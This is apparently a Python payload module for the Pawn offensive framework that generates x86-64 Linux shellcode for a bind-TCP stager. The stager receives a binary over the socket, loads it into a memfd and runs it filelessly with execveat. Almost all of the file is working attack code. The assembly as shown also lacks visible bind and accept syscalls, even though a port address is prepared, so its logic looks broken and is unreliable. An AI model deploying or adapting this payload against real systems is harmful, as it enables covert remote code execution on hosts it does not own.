"""
This module requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
"""

from textwrap import dedent

from pex.assembler import Assembler

from pawn.lib.module import *


class PawnModule(Module, Assembler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "linux/x64/bind_tcp_memfd",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
                'Tomas Globis (Tomasglgg) - payload developer'
            ],
            'Arch': "x64",
            'Platform': "linux",
            'Type': "bind_tcp",
        })

        self.port = PortOption(None, 'Port to bind to.', True)
        self.length = IntegerOption(None, 'Length of the implant.', False)
        self.reliable = BooleanOption('yes', 'Make payload reliable.', True)

    def run(self):
        payload = dedent(f"""\
            start:
                push 0x29
                pop  rax
                cdq
                push 0x2
                pop  rdi
                push 0x1
                pop  rsi
                syscall
        
                xchg rdi, rax
                push rdx
                mov  dword ptr [rsp], 0x{self.port.little.hex()}0002
                mov  rsi, rsp
                push 0x10
                pop  rdx
                push 0x32
                pop  rax
                syscall
        """)

        if self.length.value:
            payload += dedent(f"""\
                    push {hex(self.length.value)}
            """)

        else:
            payload += dedent(f"""\
                    push 0x8
                    pop  rdx
                    push 0x0
                    lea  rsi, [rsp]
                    xor  rax, rax
                    syscall
            """)

            if self.reliable.value:
                payload += dedent(f"""\
                        test rax, rax
                        js   fail
                """)

        payload += dedent("""\
                pop  r12
                push rdi
                pop  r13

                xor  rax, rax
                push rax
                push rsp
                sub  rsp, 8
                mov  rdi, rsp
                push 0x13f
                pop  rax
                xor  rsi, rsi
                syscall

                push rax
                pop  r14

                push 0x9
                pop  rax
                xor  rdi, rdi
                push r12
                pop  rsi
                push 0x7
                pop  rdx
                xor  r9, r9
                push 0x22
                pop  r10
                syscall

                push rax
                pop  r15
        """)

        if self.reliable.value:
            payload += dedent(f"""\
                    test rax, rax
                    js   fail
            """)

        payload += dedent(f"""\
                push 0x2d
                pop  rax
                push r13
                pop  rdi
                push r15
                pop  rsi
                push r12
                pop  rdx
                push 0x100
                pop  r10
                syscall

                push 0x1
                pop  rax
                push r14
                pop  rdi
                push r12
                pop  rdx
                syscall

                push 0x142
                pop  rax
                push r14
                pop  rdi
                push rsp
                sub  rsp, 8
                mov  rsi, rsp
                xor  r10, r10
                xor  rdx, rdx
                push 0x1000
                pop  r8
                syscall
        """)

        if self.reliable.value:
            payload += dedent("""\
                fail:
                    push 0x3c
                    pop  rax
                    xor  rdi, rdi
                    syscall
            """)

        return self.assemble(
            self.details['Arch'], payload)
